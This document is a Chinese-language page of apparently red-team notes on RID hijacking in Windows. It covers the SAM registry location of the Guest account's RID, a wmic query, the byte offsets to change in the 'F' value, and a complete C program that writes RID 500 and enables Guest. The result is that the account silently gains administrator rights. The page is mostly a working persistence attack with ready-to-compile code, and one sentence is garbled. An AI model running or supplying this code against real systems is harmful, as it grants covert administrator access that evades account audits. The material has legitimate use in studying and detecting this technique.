---
description: RID-hijack
---

# RID劫持

## RID Hijack简介

在windows系统内，使用rid区分用户组和用户账户，rid是安全标识符sid的一部分，每创建一个组或一个用户，都会往后递增一位，通常administrator的rid始终为500，而标准用户通常以1001开始。

![](../.gitbook/assets/image%20%2837%29.png)

 [Sebastian Castr](https://twitter.com/r4wd3r)发现可以通过修改注册表来劫持有效账户的RID，使guest成为管理员，同时进行活动的话会以原本的身份记录在日志内。

## 手工操作

windows内置访客账户guest的rid信息储存在一下键值对内。

```text
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\Guest
```

![0x1f5&#x8F6C;&#x6362;&#x6210;&#x5341;&#x8FDB;&#x5236;501](../.gitbook/assets/image%20%2825%29.png)

也可以通过wmic查询。

```text
wmic useraccount where (name='Guest') get name,sid
```

![](../.gitbook/assets/image%20%2831%29.png)

通过RID在如下键值对内寻找账户的相关信息。

```text
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5
```

找到如下注册表项的键值对“F",此键值对内存储着标识账户RID和是否开启的数值。

PS:需要system权限。

![](../.gitbook/assets/image%20%2875%29.png)

在"F"键值对偏移0x30的位置存储着RID，修改为0xF401\(500\)即可劫持RID。

偏移0x38确定账户是否启用\(0X1502-&gt;关闭,0x1402-&gt;启用\)。

更改这些值将启用启用来宾帐户（有时情况下一部分），并劫持提升的RID（本地管理员）。来宾帐户将具有管理员权限，但是该帐户仍然不会出现在本地管理员组中。

## 代码实现

由于powershell和bat的脚本在互联网上可以轻易找到，这里只给出c的版本。

在metasploit和empire内也有比较成熟的模块。

```text
#include <Windows.h>
#include <stdio.h>


int  main()
{
	HKEY hKey = NULL;
	PCHAR KeyAddr = NULL;
	DWORD KeySize;
	DWORD KeyType;
	BYTE Buffer[0x50] = { 0 };
	KeyAddr = (PCHAR)"SAM\\SAM\\Domains\\Account\\Users\\000001F5";

	RegOpenKeyExA(HKEY_LOCAL_MACHINE, KeyAddr, 0, KEY_ALL_ACCESS, &hKey);
	RegQueryValueExA(hKey, "F", NULL, &KeyType, (LPBYTE)&Buffer, &KeySize);

	Buffer[0x30] = (BYTE)0xf4; //hijack rid
	Buffer[0x38] = (BYTE)0x14; //enable guest
	
	RegSetValueExA(hKey, "F",NULL, KeyType, Buffer, KeySize);
	RegCloseKey(hKey);
	return 0;
}

```

## LINKS

{% embed url="https://pentestlab.blog/category/red-team/persistence/page/1/" %}

{% embed url="https://xz.aliyun.com/t/2998" %}



